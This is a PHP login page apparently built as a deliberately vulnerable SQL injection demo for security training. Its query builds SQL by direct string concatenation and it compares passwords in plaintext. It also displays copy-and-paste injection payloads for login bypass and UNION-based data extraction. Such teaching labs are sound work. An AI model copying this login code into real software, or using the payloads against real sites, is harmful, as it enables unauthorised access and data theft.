<?php
session_start();
include 'config/db.php';

$message = "";
$debug_query = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the login input (can be email OR username)
    $login = $_POST['login'];
    $password = $_POST['password'];
    
    // 🔓 VULNERABLE SQL QUERY - Direct string concatenation
    $query = "SELECT id, username, email, password, role 
              FROM users 
              WHERE username = '$login' OR email = '$login'";
    
    $debug_query = $query;
    $result = mysqli_query($conn, $query);
    
    if ($result && $user = mysqli_fetch_assoc($result)) {
        if ($password == $user['password']) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['role'] = $user['role'];
            $_SESSION['logged_in'] = true;
            
            header("Location: index.php");
            exit();
        } else {
            $message = "❌ Incorrect password.";
        }
    } else {
        $message = "❌ User not found.";
    }
    
    if (!$result) {
        $message = "Database Error: " . mysqli_error($conn);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Login - SQL Injection Demo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #1a1a2e; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .login-box { 
            background: #16213e; 
            padding: 40px; 
            border-radius: 10px; 
            box-shadow: 0 0 50px rgba(255, 71, 87, 0.3);
            width: 500px; 
            border: 1px solid #ff4757;
        }
        h2 { 
            text-align: center; 
            color: #fff; 
            margin-bottom: 20px; 
        }
        .vuln-badge { 
            background: #ff4757; 
            color: white; 
            padding: 5px 15px; 
            border-radius: 5px; 
            display: inline-block; 
            font-size: 14px;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .subtitle { color: #aaa; text-align: center; margin-bottom: 20px; font-size: 14px; }
        input { 
            width: 100%; 
            padding: 12px; 
            margin: 10px 0; 
            border: 1px solid #333; 
            border-radius: 5px; 
            background: #0f3460;
            color: #fff;
            font-size: 14px;
            box-sizing: border-box; 
        }
        input:focus { outline: 2px solid #ff4757; border: none; }
        button { 
            width: 100%; 
            padding: 12px; 
            background: #ff4757; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover { background: #ff3838; }
        .message { 
            padding: 12px; 
            margin: 10px 0; 
            border-radius: 5px; 
            background: #ffd93d;
            color: #1a1a2e;
        }
        .debug { 
            background: #0f3460; 
            color: #00d2ff; 
            font-family: monospace; 
            padding: 15px; 
            border-radius: 5px; 
            margin: 15px 0; 
            word-break: break-all; 
            font-size: 13px;
            border-left: 3px solid #ff4757;
        }
        .payloads { 
            background: #0f3460; 
            padding: 15px; 
            border-radius: 5px; 
            margin: 15px 0; 
            border: 2px dashed #ff4757;
        }
        .payloads strong { color: #ff4757; display: block; margin-bottom: 10px; }
        .payloads code { 
            background: #1a1a2e; 
            color: #ff6b6b; 
            padding: 5px 10px; 
            border-radius: 3px; 
            display: block; 
            margin: 5px 0;
            font-size: 13px;
            border-left: 3px solid #ffd93d;
        }
        .payloads .label { color: #ffd93d; font-size: 12px; }
        .nav-links { text-align: center; margin-top: 20px; }
        .nav-links a { color: #00d2ff; text-decoration: none; font-size: 13px; }
        .nav-links a:hover { text-decoration: underline; }
        .success { 
            background: #00b894; 
            color: white; 
            padding: 10px; 
            border-radius: 5px; 
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>
            <span class="vuln-badge">🔓 VULNERABLE</span>
            <br>SQL Injection Demo
        </h2>
        <p class="subtitle">🔥 This page is intentionally vulnerable for security testing</p>
        
        <div class="payloads">
            <strong>💉 SQL Injection Payloads (Copy & Paste):</strong>
            <span class="label">Basic Bypass:</span>
            <code>' OR '1'='1' -- </code>
            <span class="label">Login as Admin:</span>
            <code>admin' -- </code>
            <span class="label">Alternative Bypass:</span>
            <code>' OR 1=1#</code>
            <span class="label">Union Injection:</span>
            <code>' UNION SELECT 1, 'hacker', 'hack@email.com', 'pass', 'admin' -- </code>
            <span class="label">Get Database Info:</span>
            <code>' UNION SELECT 1, database(), user(), version(), 5 -- </code>
        </div>
        
        <?php if($message): ?>
        <div class="message">
            <?php echo $message; ?>
        </div>
        <?php endif; ?>
        
        <?php if($debug_query): ?>
        <div class="debug">
            <strong>🔍 SQL Query Executed:</strong><br>
            <?php echo htmlspecialchars($debug_query); ?>
        </div>
        <?php endif; ?>
        
        <form method="POST">
            <input type="text" name="login" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">🚀 Login (Vulnerable)</button>
        </form>
        
        <div class="nav-links">
            <a href="login.php">🔒 Go to Secure Login</a><br>
            <a href="index.php">🏠 Back to Home</a>
        </div>
    </div>
</body>
</html>
